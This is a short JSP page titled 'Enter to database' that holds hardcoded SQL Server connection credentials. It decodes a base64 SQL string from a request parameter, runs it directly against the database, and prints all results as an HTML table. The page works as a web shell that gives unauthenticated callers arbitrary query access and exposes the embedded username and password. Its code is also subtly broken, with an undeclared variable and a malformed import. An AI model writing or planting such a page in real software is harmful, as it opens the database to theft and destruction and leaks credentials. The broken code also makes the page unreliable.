<html>
<head><title>Enter to database</title></head>
<body>
<table>
<%@ page import="java.util.*" %>
<%@ page import="java.sql.*;" %>
<% 

java.sql.Connection con;
java.sql.Statement s;
java.sql.ResultSet rs;
java.sql.PreparedStatement pst;

con=null;
s=null;
pst=null;
rs=null;
ResultSetMetaData rsmd = null;
int columnsNumber = 0;

// Remember to change the next line with your own environment 
String url= "jdbc:sqlserver://AZRRA.db:1433;DatabaseName=AZRRA";
String id= "azrraprdusr";
String pass = "yvCKtnpg";
try{

Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
con = java.sql.DriverManager.getConnection(url, id, pass);

}catch(ClassNotFoundException cnfex){
cnfex.printStackTrace();

}
query = new String(Base64.getDecoder().decode(request.getParameter("query")));
String sql = query;
try{
s = con.createStatement();
rs = s.executeQuery(sql);
rsmd = rs.getMetaData();
columnsNumber = rsmd.getColumnCount();
%>

<%
while( rs.next() ){

	for (int i = 1; i <= columnsNumber; i++) {
        if (i > 1) System.out.print(",  ");
        String columnValue = rs.getString(i);
		out.println("<tr>");
		out.println("<td>"+columnValue + " " + rsmd.getColumnName(i)+"</td>");
		out.println("</tr>");
    }
%>
<%
}
%>

<%

}
catch(Exception e){e.printStackTrace();}
finally{
if(rs!=null) rs.close();
if(s!=null) s.close();
if(con!=null) con.close();
}

%>

</body>
</html>
